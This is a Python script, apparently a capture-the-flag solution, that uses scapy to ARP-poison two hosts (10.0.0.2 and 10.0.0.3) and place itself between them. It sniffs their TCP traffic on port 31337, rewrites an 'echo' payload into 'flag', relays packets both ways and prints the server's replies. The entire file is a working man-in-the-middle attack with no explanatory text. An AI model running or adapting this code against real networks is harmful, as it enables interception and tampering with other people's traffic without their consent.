from scapy.all import *
import threading
import time

def gatherMac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface ="eth0", inter = 0.1)
    for snd,rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

client_mac = gatherMac("10.0.0.2")
server_mac = gatherMac("10.0.0.3")
my_mac = get_if_hwaddr("eth0")
server_ip = "10.0.0.3"
client_ip = "10.0.0.2"
port = 31337
iface= "eth0"


def poison():
    while True:
        try:
            send(ARP(op=2,psrc="10.0.0.2",pdst="10.0.0.3",hwdst=server_mac),verbose=False)
            send(ARP(op=2,psrc="10.0.0.3",pdst="10.0.0.2",hwdst=client_mac),verbose=False) 
            time.sleep(1.5)
        except KeyboardInterrupt:
            break


def relay(pkt):
    if Ether not in pkt or IP not in pkt:
        return
    if pkt[Ether].src == my_mac:
        return
    if pkt[IP].src == client_ip and pkt[IP].dst == server_ip:
        if Raw in pkt and pkt[Raw].load== b"echo":
            pkt[Raw].load = b"flag"
    
        pkt[Ether].src = my_mac
        pkt[Ether].dst = server_mac
        del pkt[IP].chksum
        del pkt[IP].len
        del pkt[TCP].chksum
        sendp(pkt, iface=iface, verbose=False)
        print("relayed from my_mac to server_mac")
    elif pkt[IP].src == server_ip and pkt[IP].dst == client_ip:
        if Raw in pkt:
            print(pkt[Raw].load)

        pkt[Ether].src = my_mac
        pkt[Ether].dst = client_mac
        del pkt[IP].chksum
        del pkt[IP].len
        del pkt[TCP].chksum
        sendp(pkt, iface=iface, verbose=False)
        print("relayed from my_mac to client_mac")

def relay2():
    sniff(iface=iface,store=False,prn=relay,filter=f"tcp and port {port} and host {client_ip} and host {server_ip}")


t1 = threading.Thread(target=relay2,daemon=True)
t1.start()

t=threading.Thread(target=poison,daemon=True)
t.start()

t1.join()
t.join()
